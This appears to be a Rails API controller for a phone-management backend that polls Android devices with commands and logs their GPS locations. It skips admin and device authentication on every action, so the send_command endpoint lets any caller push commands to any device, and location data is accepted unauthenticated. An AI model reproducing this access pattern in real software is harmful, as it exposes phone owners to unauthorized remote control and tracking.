# API Controller for REST-based command polling (fallback for WebSocket)
# Uses DB PendingCommand table — no Redis dependency.
module Api
  class CommandsController < Api::BaseController
    skip_before_action :authenticate_admin_user!, raise: false
    skip_before_action :authenticate_device!, raise: false

    # GET /api/commands/:id  (id = device_id)
    # Android device polls for pending commands, marks them processing
    def show
      device_id = sanitize_device_id(params[:id])
      smartphone = Smartphone.find_by(device_id: device_id)
      return render json: { commands: [] } unless smartphone

      pending = smartphone.pending_commands.where(status: :pending).order(:created_at).limit(10)
      commands = pending.map do |cmd|
        cmd.update_column(:status, 1) # processing
        { id: cmd.id, request_id: cmd.request_id, action: cmd.command, params: cmd.params || {} }
      end

      render json: { commands: commands }
    end

    # POST /api/commands/:id/ack
    # Device acknowledges command execution with response data
    def ack
      cmd = PendingCommand.find_by(request_id: params[:command_id]) ||
            PendingCommand.find_by(id: params[:command_id])
      if cmd
        response_data = begin
          params[:response].to_unsafe_h
        rescue StandardError
          params[:response]
        end if params[:response].present?
        cmd.mark_completed(response_data)
        Rails.logger.info "[API::Commands] ACK #{cmd.command} (#{cmd.request_id})"
      end
      render json: { status: 'ok' }
    end

    # POST /api/commands/:id/respond
    # Device sends command response (same as WS response but via HTTP)
    def respond
      device_id = sanitize_device_id(params[:id])
      request_id = params[:request_id]
      response_type = params[:type]
      payload = params[:payload]

      if request_id.present?
        cmd = PendingCommand.find_by(request_id: request_id)
        if cmd
          cmd.mark_completed({ type: response_type, payload: payload })
          Rails.logger.info "[API::Commands] Response for #{cmd.command} from #{device_id}"
        end
      end

      render json: { status: 'ok' }
    end

    # POST /api/commands/:id/send
    # Admin sends command — creates PendingCommand + broadcasts via ActionCable
    def send_command
      device_id = sanitize_device_id(params[:id])
      command = params[:command]
      command_params = params[:params] || {}
      smartphone = Smartphone.find_by(device_id: device_id)

      if smartphone
        request_id = SecureRandom.uuid
        PendingCommand.create!(
          smartphone: smartphone,
          request_id: request_id,
          command: command,
          params: command_params,
          status: :pending
        )
      end

      ActionCable.server.broadcast(
        "commands_#{device_id}",
        { type: 'command', action: command, params: command_params }
      )

      Rails.logger.info "[API::Commands] Command '#{command}' sent to #{device_id}"
      render json: { status: 'ok', command: command, device_id: device_id }
    end

    # POST /api/location
    def location
      device_id = sanitize_device_id(request.headers['X-Device-Id'] || params[:device_id])
      smartphone = find_or_create_smartphone(device_id)
      return render json: { error: 'Device not found' }, status: :not_found unless smartphone

      latitude = params[:latitude]
      longitude = params[:longitude]
      unless valid_coordinates?(latitude, longitude)
        return render json: { error: 'Invalid coordinates' }, status: :unprocessable_entity
      end

      formatted_time = if params[:timestamp].present?
        Time.at(params[:timestamp].to_i / 1000).strftime('%Y-%m-%d %H:%M:%S')
      else
        Time.current.strftime('%Y-%m-%d %H:%M:%S')
      end

      lat_value = latitude.to_f
      long_value = longitude.to_f

      unless lat_value.between?(-90, 90) && long_value.between?(-180, 180)
        return render json: { error: 'Invalid coordinates' }, status: :unprocessable_entity
      end

      GeoLocation.create!(
        smartphone: smartphone,
        latitude: lat_value,
        longitude: long_value,
        date: formatted_time
      )

      render json: { status: 'ok' }
    end

  private

    def valid_coordinates?(lat, long)
      lat.present? && long.present? &&
        lat.to_f.between?(-90, 90) && long.to_f.between?(-180, 180)
    rescue StandardError
      false
    end
  end
end
